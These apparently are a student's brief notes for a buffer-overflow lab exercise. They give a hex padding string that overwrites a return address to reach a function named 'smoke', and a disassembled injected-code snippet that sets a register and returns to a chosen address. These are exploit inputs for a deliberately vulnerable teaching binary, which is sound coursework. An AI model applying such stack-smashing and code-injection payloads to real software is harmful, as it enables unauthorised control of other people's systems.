
phase 0:

0001 0001 0002 0002 0003 0004 0004 6094 0408
we need 4 regs filled with crap so that we can change the ret to smoke's initial address

phase 1:


00000000 <.text>:
   0:	b8 e3 ed 46 1e       	mov    $0x1e46ede3,%eax
   5:	68 4c 95 04 08       	push   $0x804954c
   a:	c3                   	ret    
